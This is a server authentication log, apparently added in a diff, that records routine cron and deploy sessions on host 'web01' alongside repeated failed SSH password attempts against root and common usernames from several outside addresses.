+Mar 14 17:28:42 web01 sshd[60220]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Mar 14 17:30:01 web01 CRON[52801]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:30:02 web01 CRON[52801]: pam_unix(cron:session): session closed for user root
+Mar 14 17:33:06 web01 sshd[58513]: pam_unix(sshd:session): session closed for user alice
+Mar 14 17:37:27 web01 sshd[11735]: Failed password for root from 192.0.2.145 port 37218 ssh2
+Mar 14 17:40:01 web01 CRON[15994]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:40:02 web01 CRON[15994]: pam_unix(cron:session): session closed for user root
+Mar 14 17:47:00 web01 sshd[40136]: Failed password for root from 192.0.2.49 port 50901 ssh2
+Mar 14 17:47:38 web01 sshd[55796]: Invalid user oracle from 192.0.2.49 port 40458
+Mar 14 17:47:38 web01 sshd[55796]: Failed password for invalid user oracle from 192.0.2.49 port 40458 ssh2
+Mar 14 17:49:00 web01 sshd[17198]: Failed password for root from 198.51.100.151 port 42514 ssh2
+Mar 14 17:50:01 web01 CRON[37019]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:50:02 web01 CRON[37019]: pam_unix(cron:session): session closed for user root
+Mar 14 17:51:55 web01 sshd[62453]: Invalid user user from 198.51.100.151 port 44022
+Mar 14 17:51:55 web01 sshd[62453]: Failed password for invalid user user from 198.51.100.151 port 44022 ssh2
+Mar 14 17:55:00 web01 sshd[47920]: Invalid user oracle from 192.0.2.55 port 52167
+Mar 14 17:55:00 web01 sshd[47920]: Failed password for invalid user oracle from 192.0.2.55 port 52167 ssh2
+Mar 14 17:55:54 web01 sshd[42719]: Invalid user ubuntu from 192.0.2.49 port 56731
+Mar 14 17:55:54 web01 sshd[42719]: Failed password for invalid user ubuntu from 192.0.2.49 port 56731 ssh2
+Mar 14 17:56:25 web01 sshd[26655]: Invalid user user from 192.0.2.55 port 45172
+Mar 14 17:56:25 web01 sshd[26655]: Failed password for invalid user user from 192.0.2.55 port 45172 ssh2
+Mar 14 18:00:01 web01 CRON[4003]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:00:02 web01 CRON[4003]: pam_unix(cron:session): session closed for user root
+Mar 14 18:01:51 web01 sshd[13272]: Failed password for root from 192.0.2.49 port 48476 ssh2
+Mar 14 18:02:16 web01 sshd[12700]: Invalid user oracle from 192.0.2.55 port 35266
+Mar 14 18:02:16 web01 sshd[12700]: Failed password for invalid user oracle from 192.0.2.55 port 35266 ssh2
+Mar 14 18:02:39 web01 sshd[22675]: Invalid user user from 192.0.2.55 port 37003
+Mar 14 18:02:39 web01 sshd[22675]: Failed password for invalid user user from 192.0.2.55 port 37003 ssh2
+Mar 14 18:04:00 web01 sshd[12003]: Invalid user ubuntu from 198.51.100.26 port 53355
+Mar 14 18:04:00 web01 sshd[12003]: Failed password for invalid user ubuntu from 198.51.100.26 port 53355 ssh2
+Mar 14 18:05:43 web01 sshd[63276]: Accepted publickey for deploy from 10.0.5.10 port 37766 ssh2
+Mar 14 18:05:43 web01 sshd[63276]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 18:06:03 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 18:06:36 web01 sshd[64207]: Invalid user ubuntu from 198.51.100.26 port 49874
+Mar 14 18:06:36 web01 sshd[64207]: Failed password for invalid user ubuntu from 198.51.100.26 port 49874 ssh2
+Mar 14 18:10:01 web01 CRON[51855]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:10:02 web01 CRON[51855]: pam_unix(cron:session): session closed for user root
+Mar 14 18:11:38 web01 sshd[17466]: Invalid user ubuntu from 198.51.100.26 port 46837
+Mar 14 18:11:38 web01 sshd[17466]: Failed password for invalid user ubuntu from 198.51.100.26 port 46837 ssh2
+Mar 14 18:11:42 web01 sshd[60220]: pam_unix(sshd:session): session closed for user alice
+Mar 14 18:20:01 web01 CRON[37399]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:20:02 web01 CRON[37399]: pam_unix(cron:session): session closed for user root
+Mar 14 18:20:44 web01 sshd[62234]: pam_unix(sshd:session): session closed for user carlos
+Mar 14 18:30:01 web01 CRON[48614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:30:02 web01 CRON[48614]: pam_unix(cron:session): session closed for user root
+Mar 14 18:35:37 web01 sshd[64522]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 18:40:01 web01 CRON[43320]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:40:02 web01 CRON[43320]: pam_unix(cron:session): session closed for user root
+Mar 14 18:50:01 web01 CRON[21139]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 18:50:02 web01 CRON[21139]: pam_unix(cron:session): session closed for user root
+Mar 14 19:00:01 web01 CRON[56602]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:00:02 web01 CRON[56602]: pam_unix(cron:session): session closed for user root
+Mar 14 19:05:00 web01 sshd[57233]: Invalid user admin from 192.0.2.98 port 43331
+Mar 14 19:05:00 web01 sshd[57233]: Failed password for invalid user admin from 192.0.2.98 port 43331 ssh2
+Mar 14 19:05:49 web01 sshd[39729]: Accepted publickey for deploy from 10.0.5.10 port 54774 ssh2
+Mar 14 19:05:49 web01 sshd[39729]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 19:06:09 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 19:09:53 web01 sshd[40840]: Invalid user oracle from 192.0.2.98 port 33272
+Mar 14 19:09:53 web01 sshd[40840]: Failed password for invalid user oracle from 192.0.2.98 port 33272 ssh2
+Mar 14 19:10:01 web01 CRON[59419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:10:02 web01 CRON[59419]: pam_unix(cron:session): session closed for user root
+Mar 14 19:12:43 web01 sshd[63276]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 19:20:01 web01 CRON[15001]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:20:02 web01 CRON[15001]: pam_unix(cron:session): session closed for user root
+Mar 14 19:21:00 web01 sshd[44163]: Invalid user admin from 192.0.2.166 port 33456
+Mar 14 19:21:00 web01 sshd[44163]: Failed password for invalid user admin from 192.0.2.166 port 33456 ssh2
+Mar 14 19:22:00 web01 sshd[7580]: Invalid user oracle from 192.0.2.166 port 53162
+Mar 14 19:22:00 web01 sshd[7580]: Failed password for invalid user oracle from 192.0.2.166 port 53162 ssh2
+Mar 14 19:23:55 web01 sshd[9569]: Invalid user user from 192.0.2.166 port 44171
+Mar 14 19:23:55 web01 sshd[9569]: Failed password for invalid user user from 192.0.2.166 port 44171 ssh2
+Mar 14 19:24:54 web01 sshd[58518]: Invalid user admin from 192.0.2.166 port 55531
+Mar 14 19:24:54 web01 sshd[58518]: Failed password for invalid user admin from 192.0.2.166 port 55531 ssh2
+Mar 14 19:25:05 web01 sshd[5827]: Invalid user user from 192.0.2.166 port 51919
+Mar 14 19:25:05 web01 sshd[5827]: Failed password for invalid user user from 192.0.2.166 port 51919 ssh2
+Mar 14 19:28:00 web01 sshd[46896]: Invalid user pi from 198.51.100.17 port 34989
+Mar 14 19:28:00 web01 sshd[46896]: Failed password for invalid user pi from 198.51.100.17 port 34989 ssh2
+Mar 14 19:28:33 web01 sshd[49186]: Invalid user pi from 198.51.100.17 port 34583
+Mar 14 19:28:33 web01 sshd[49186]: Failed password for invalid user pi from 198.51.100.17 port 34583 ssh2
+Mar 14 19:29:42 web01 sshd[9455]: Invalid user oracle from 192.0.2.166 port 49532
+Mar 14 19:29:42 web01 sshd[9455]: Failed password for invalid user oracle from 192.0.2.166 port 49532 ssh2
+Mar 14 19:30:01 web01 CRON[41068]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:30:02 web01 CRON[41068]: pam_unix(cron:session): session closed for user root
+Mar 14 19:35:42 web01 sshd[26140]: Invalid user user from 192.0.2.166 port 56913
+Mar 14 19:35:42 web01 sshd[26140]: Failed password for invalid user user from 192.0.2.166 port 56913 ssh2
+Mar 14 19:39:00 web01 sshd[36399]: Invalid user test from 192.0.2.78 port 48025
+Mar 14 19:39:00 web01 sshd[36399]: Failed password for invalid user test from 192.0.2.78 port 48025 ssh2
+Mar 14 19:40:01 web01 CRON[64862]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:40:02 web01 CRON[64862]: pam_unix(cron:session): session closed for user root
+Mar 14 19:40:12 web01 sshd[10521]: Invalid user test from 192.0.2.78 port 43908
+Mar 14 19:40:12 web01 sshd[10521]: Failed password for invalid user test from 192.0.2.78 port 43908 ssh2
+Mar 14 19:43:49 web01 sshd[28309]: Invalid user test from 192.0.2.78 port 47015
+Mar 14 19:43:49 web01 sshd[28309]: Failed password for invalid user test from 192.0.2.78 port 47015 ssh2
+Mar 14 19:50:01 web01 CRON[12848]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 19:50:02 web01 CRON[12848]: pam_unix(cron:session): session closed for user root
+Mar 14 20:00:01 web01 CRON[35673]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:00:02 web01 CRON[35673]: pam_unix(cron:session): session closed for user root
+Mar 14 20:05:02 web01 sshd[43015]: Accepted publickey for deploy from 10.0.5.10 port 51132 ssh2
+Mar 14 20:05:02 web01 sshd[43015]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 20:05:22 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 20:10:01 web01 CRON[35518]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:10:02 web01 CRON[35518]: pam_unix(cron:session): session closed for user root
+Mar 14 20:19:00 web01 sshd[45601]: Failed password for root from 192.0.2.149 port 58592 ssh2
+Mar 14 20:20:01 web01 CRON[35632]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:20:02 web01 CRON[35632]: pam_unix(cron:session): session closed for user root
+Mar 14 20:22:52 web01 sshd[22515]: Failed password for root from 192.0.2.149 port 60669 ssh2
+Mar 14 20:24:57 web01 sshd[5841]: Failed password for root from 192.0.2.149 port 35185 ssh2
+Mar 14 20:27:32 web01 sshd[32004]: Failed password for root from 192.0.2.149 port 57165 ssh2
+Mar 14 20:28:00 web01 sshd[32743]: Invalid user ubuntu from 198.51.100.213 port 41178
+Mar 14 20:28:00 web01 sshd[32743]: Failed password for invalid user ubuntu from 198.51.100.213 port 41178 ssh2
+Mar 14 20:30:01 web01 CRON[13123]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:30:02 web01 CRON[13123]: pam_unix(cron:session): session closed for user root
+Mar 14 20:30:49 web01 sshd[39729]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 20:40:01 web01 CRON[51811]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:40:02 web01 CRON[51811]: pam_unix(cron:session): session closed for user root
+Mar 14 20:50:01 web01 CRON[44426]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 20:50:02 web01 CRON[44426]: pam_unix(cron:session): session closed for user root
+Mar 14 20:51:00 web01 sshd[35896]: Invalid user pi from 192.0.2.249 port 52894
+Mar 14 20:51:00 web01 sshd[35896]: Failed password for invalid user pi from 192.0.2.249 port 52894 ssh2
+Mar 14 20:54:42 web01 sshd[60659]: Invalid user ubuntu from 192.0.2.249 port 36051
+Mar 14 20:54:42 web01 sshd[60659]: Failed password for invalid user ubuntu from 192.0.2.249 port 36051 ssh2
+Mar 14 21:00:01 web01 CRON[4305]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:00:02 web01 CRON[4305]: pam_unix(cron:session): session closed for user root
+Mar 14 21:02:00 web01 sshd[25168]: Invalid user ubuntu from 198.51.100.250 port 41456
+Mar 14 21:02:00 web01 sshd[25168]: Failed password for invalid user ubuntu from 198.51.100.250 port 41456 ssh2
+Mar 14 21:03:46 web01 sshd[42135]: Failed password for root from 198.51.100.250 port 47296 ssh2
+Mar 14 21:05:18 web01 sshd[2038]: Accepted publickey for deploy from 10.0.5.10 port 37640 ssh2
+Mar 14 21:05:18 web01 sshd[2038]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 21:05:38 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 21:10:01 web01 CRON[49913]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:10:02 web01 CRON[49913]: pam_unix(cron:session): session closed for user root
+Mar 14 21:11:02 web01 sshd[43015]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 21:20:01 web01 CRON[33418]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:20:02 web01 CRON[33418]: pam_unix(cron:session): session closed for user root
+Mar 14 21:26:18 web01 sshd[2038]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 21:30:01 web01 CRON[47113]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:30:02 web01 CRON[47113]: pam_unix(cron:session): session closed for user root
+Mar 14 21:36:00 web01 sshd[55217]: Invalid user ubuntu from 192.0.2.28 port 43442
+Mar 14 21:36:00 web01 sshd[55217]: Failed password for invalid user ubuntu from 192.0.2.28 port 43442 ssh2
+Mar 14 21:36:32 web01 sshd[51933]: Failed password for root from 192.0.2.28 port 44590 ssh2
+Mar 14 21:40:01 web01 CRON[49267]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:40:02 web01 CRON[49267]: pam_unix(cron:session): session closed for user root
+Mar 14 21:42:18 web01 sshd[60871]: Invalid user ubuntu from 192.0.2.28 port 55660
+Mar 14 21:42:18 web01 sshd[60871]: Failed password for invalid user ubuntu from 192.0.2.28 port 55660 ssh2
+Mar 14 21:42:30 web01 sshd[7782]: Failed password for root from 192.0.2.28 port 50414 ssh2
+Mar 14 21:50:01 web01 CRON[39257]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 21:50:02 web01 CRON[39257]: pam_unix(cron:session): session closed for user root
+Mar 14 22:00:01 web01 CRON[30831]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:00:02 web01 CRON[30831]: pam_unix(cron:session): session closed for user root
+Mar 14 22:05:29 web01 sshd[6264]: Accepted publickey for deploy from 10.0.5.10 port 54044 ssh2
+Mar 14 22:05:29 web01 sshd[6264]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 22:05:49 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 22:10:00 web01 sshd[1010]: Invalid user admin from 198.51.100.219 port 59263
+Mar 14 22:10:00 web01 sshd[1010]: Failed password for invalid user admin from 198.51.100.219 port 59263 ssh2
+Mar 14 22:10:01 web01 CRON[64792]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:10:02 web01 CRON[64792]: pam_unix(cron:session): session closed for user root
+Mar 14 22:12:25 web01 sshd[4879]: Invalid user ubuntu from 198.51.100.219 port 50458
+Mar 14 22:12:25 web01 sshd[4879]: Failed password for invalid user ubuntu from 198.51.100.219 port 50458 ssh2
+Mar 14 22:12:36 web01 sshd[56386]: Invalid user oracle from 198.51.100.219 port 54133
+Mar 14 22:12:36 web01 sshd[56386]: Failed password for invalid user oracle from 198.51.100.219 port 54133 ssh2
+Mar 14 22:14:00 web01 sshd[10097]: Invalid user oracle from 192.0.2.151 port 55044
+Mar 14 22:14:00 web01 sshd[10097]: Failed password for invalid user oracle from 192.0.2.151 port 55044 ssh2
+Mar 14 22:20:01 web01 CRON[59903]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:20:02 web01 CRON[59903]: pam_unix(cron:session): session closed for user root
+Mar 14 22:21:09 web01 sshd[63814]: Invalid user admin from 198.51.100.219 port 41888
+Mar 14 22:21:09 web01 sshd[63814]: Failed password for invalid user admin from 198.51.100.219 port 41888 ssh2
+Mar 14 22:30:01 web01 CRON[2609]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:30:02 web01 CRON[2609]: pam_unix(cron:session): session closed for user root
+Mar 14 22:40:01 web01 CRON[53755]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:40:02 web01 CRON[53755]: pam_unix(cron:session): session closed for user root
+Mar 14 22:50:01 web01 CRON[35229]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 22:50:02 web01 CRON[35229]: pam_unix(cron:session): session closed for user root
+Mar 14 23:00:01 web01 CRON[32954]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:00:02 web01 CRON[32954]: pam_unix(cron:session): session closed for user root
+Mar 14 23:05:31 web01 sshd[61980]: Accepted publickey for deploy from 10.0.5.10 port 47761 ssh2
+Mar 14 23:05:31 web01 sshd[61980]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 23:05:51 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 23:10:01 web01 CRON[36541]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:10:02 web01 CRON[36541]: pam_unix(cron:session): session closed for user root
+Mar 14 23:10:31 web01 sshd[61980]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 23:20:01 web01 CRON[50294]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:20:02 web01 CRON[50294]: pam_unix(cron:session): session closed for user root
+Mar 14 23:21:00 web01 sshd[37047]: Failed password for root from 198.51.100.42 port 53821 ssh2
+Mar 14 23:26:29 web01 sshd[6264]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 23:30:01 web01 CRON[43873]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:30:02 web01 CRON[43873]: pam_unix(cron:session): session closed for user root
+Mar 14 23:40:01 web01 CRON[48767]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:40:02 web01 CRON[48767]: pam_unix(cron:session): session closed for user root
+Mar 14 23:50:01 web01 CRON[62144]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 23:50:02 web01 CRON[62144]: pam_unix(cron:session): session closed for user root
